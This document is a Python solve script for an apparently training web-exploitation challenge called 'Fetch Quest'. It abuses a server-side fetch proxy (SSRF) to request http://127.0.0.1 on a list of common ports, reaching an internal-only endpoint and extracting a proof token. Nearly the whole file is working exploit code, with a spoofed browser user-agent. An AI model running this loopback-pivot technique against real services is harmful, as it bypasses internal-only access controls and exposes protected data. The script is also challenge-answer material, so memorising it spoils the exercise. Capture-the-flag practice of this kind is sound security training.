#!/usr/bin/env python3
"""Fetch Quest (day-24 web-exploitation, curriculum day 15) — SSRF recovery.

Pattern: `/api/clues` discloses `feature_route` (an SSRF fetch proxy that takes an
absolute `url` query param and fetches it server-side) and `secondary_route` (an
"internal_only" endpoint on the SAME origin that refuses direct requests made
from outside the host). Point `feature_route` at `http://127.0.0.1:<port><secondary_route>`
so the fetch happens from the server's own loopback interface, which satisfies the
internal-only check; the response carries the proof.

No wordlists on the proof itself: only the internal TCP port is unknown, and the
observed variants above have differed only in which loopback port the app's own
Kestrel instance binds internally (seen so far: 8080). This script tries a short,
documented list of common ASP.NET Core container ports in order and stops at the
first one that returns a proof_<hex> string - the dispatcher never guesses the
proof text itself, only the port to reach it through.

Usage: python3 solve.py <target_base_url>
"""
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
TIMEOUT = 15
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")

# Common Kestrel / container-internal ports, tried in this order. 8080 is the
# only one observed to succeed so far (two live variants); the rest are kept as
# generic fallbacks rather than re-deriving a wordlist per attempt.
CANDIDATE_PORTS = (8080, 80, 5000, 5001, 8081, 3000, 8000, 4000, 8888, 443)


def fetch(url, params=None):
    if params:
        url = url + "?" + urllib.parse.urlencode(params)
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except urllib.error.URLError as e:
        return None, str(e.reason)


def get_json(url, params=None):
    status, body = fetch(url, params)
    try:
        return status, json.loads(body)
    except ValueError:
        return status, None


def solve(base_url):
    base = base_url.rstrip("/")
    status, clues = get_json(base + "/api/clues")
    if status != 200 or not clues:
        raise RuntimeError(f"/api/clues -> {status}: cannot classify without it")
    feature_route = clues.get("feature_route")
    secondary_route = clues.get("secondary_route")
    if not feature_route or not secondary_route:
        raise RuntimeError(f"clues missing feature_route/secondary_route: {clues}")

    for port in CANDIDATE_PORTS:
        internal_url = f"http://127.0.0.1:{port}{secondary_route}"
        status, body = get_json(base + feature_route, {"url": internal_url})
        if status == 200 and isinstance(body, dict):
            evidence = body.get("evidence", "")
            match = PROOF_RE.search(evidence) or PROOF_RE.search(json.dumps(body))
            if match:
                return match.group(0), port, clues
    raise RuntimeError(
        f"no proof found across candidate ports {CANDIDATE_PORTS} "
        f"(feature_route={feature_route}, secondary_route={secondary_route})")


def main():
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} <target_base_url>", file=sys.stderr)
        return 2
    proof, port, clues = solve(sys.argv[1])
    print(f"port={port} clues={clues}")
    print(proof)
    return 0


if __name__ == "__main__":
    sys.exit(main())
